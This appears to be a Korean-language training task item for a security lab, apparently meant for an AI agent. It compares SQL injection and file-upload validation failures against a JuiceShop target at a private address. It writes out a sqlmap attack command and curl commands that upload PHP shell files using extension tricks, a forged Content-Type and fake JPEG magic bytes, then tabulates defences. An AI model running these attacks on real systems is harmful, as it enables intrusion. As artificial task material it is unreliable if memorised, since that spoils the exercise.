- order: 99
  instruction: |
    [복합 시나리오] "input validation 실패 비교 — SQLi (컬럼 입력) vs Upload (파일/MIME)"

    ## 상황 (w04 → w05 시나리오 연속)

    w04 에서 인증·세션 매트릭스까지 마쳤다. 이번 주는 입력값 검증.

    > 선배: "SQLi 랑 파일 업로드는 다른 취약점처럼 보이지만 같은 실패야 — 입력값 검증 누락.
    > SQLi 는 컬럼 값을 그대로 쿼리에 박은 거고, 업로드는 파일명·MIME 을 그대로 믿은 거지.
    > 두 취약점 동시 점검해서 '입력 위치 × validation 종류' 매트릭스 만들어. 공통 방어 원칙도 정리하고."

    학습 목표 (lecture #2 SQLi 유형 + #4 sqlmap) + (lab #3 확장자 + #4 Content-Type + #5 Magic bytes) 통합.

    ## 임무 (3 단계, 약 35분)

    ### Phase A — SQLi validation 실패 (lecture #2·#3·#4)
    `sqlmap -u "http://10.20.30.80/rest/products/search?q=test" --batch --technique=BT --level=2` 로
    Boolean·Time-based 자동 탐지. response time 차이 (>5초) 가 Time-based 증거. sqlmap 출력의
    "[INFO] heuristic ... appears to be vulnerable" 라인 캡처.

    ### Phase B — Upload validation 실패 3 케이스 (lab #3·#4·#5)
    JuiceShop 의 `/api/Complaints/` 또는 `/file-upload` 대상 (실제 환경이 다르면 가상 URL 로 대체).
    - 확장자 우회: shell.php.jpg / shell.pHp / shell.php%00.jpg 3개 파일명 시도
    - Content-Type 변조: `curl -F "file=@shell.php;type=image/jpeg"` 헤더 위조
    - Magic bytes: `printf '\xff\xd8\xff\xe0<?php phpinfo(); ?>' > shell.php` JPEG header + PHP code

    ### Phase C — "입력 위치 × validation 종류" 매트릭스 + 공통 원칙
    | 입력 위치 | 위반 종류 | 자동 검증 | 권장 방어 |
    | URL/Body 컬럼 | SQLi (1=1, ' OR) | Prepared Statement | parameterized query |
    | 파일명 | 확장자 우회 | basename 분리 | extension allowlist |
    | Content-Type 헤더 | MIME 위조 | mime_content_type() | server-side detect |
    | 파일 내용 | Magic bytes 우회 | finfo + scan | sandbox + AV |
    표 끝에 "공통 원칙: allowlist > blocklist + 다층 검증 + 신뢰 경계 명확화" 한 줄.

    종료: echo "=== Phase A SQLi ===" / "=== Phase B Upload 3 케이스 ===" / "=== Phase C 매트릭스 ===" 묶음.
  bastion_prompt: |
    [복합 시나리오 — w05 input validation 비교]

    SQLi 와 파일 업로드 두 취약점을 같은 "input validation 실패" 관점에서 점검. 3 phase.

    Phase A (SQLi):
    `sqlmap -u "http://10.20.30.80/rest/products/search?q=test" --batch --technique=BT --level=2 --timeout=20`
    실행. Boolean·Time-based 결과 + "[INFO] ... appears to be vulnerable" 라인 캡처.

    Phase B (Upload 3 케이스):
    실제 업로드 엔드포인트가 정확하지 않으면 *PoC 명령어만 출력* 해도 OK.
    - 확장자: `for ext in php.jpg pHp 'php%00.jpg'; do curl -F "file=@/tmp/shell.$ext" http://10.20.30.80/api/Complaints/file; done`
    - Content-Type: `curl -F "file=@/tmp/shell.php;type=image/jpeg" http://10.20.30.80/api/Complaints/file`
    - Magic bytes: `printf '\xff\xd8\xff\xe0<?php phpinfo(); ?>' > /tmp/shell.php` 후 위 curl

    Phase C (매트릭스):
    ```
    | 입력 위치 | 위반 종류 | 자동 검증 | 권장 방어 |
    | URL/Body 컬럼 | SQLi (1=1, ' OR) | Prepared Statement | parameterized query |
    | 파일명 | 확장자 우회 | basename 분리 | extension allowlist |
    | Content-Type 헤더 | MIME 위조 | mime_content_type() | server-side detect |
    | 파일 내용 | Magic bytes 우회 | finfo + scan | sandbox + AV |
    ```
    표 끝에 "공통 원칙: allowlist > blocklist + 다층 검증 + 신뢰 경계 명확화" 한 줄.

    종료: echo 묶음 "=== Phase A SQLi ===" / "=== Phase B Upload ===" / "=== Phase C 매트릭스 ===".

    반드시 3 phase 모두 실행. 중간 종료 금지.
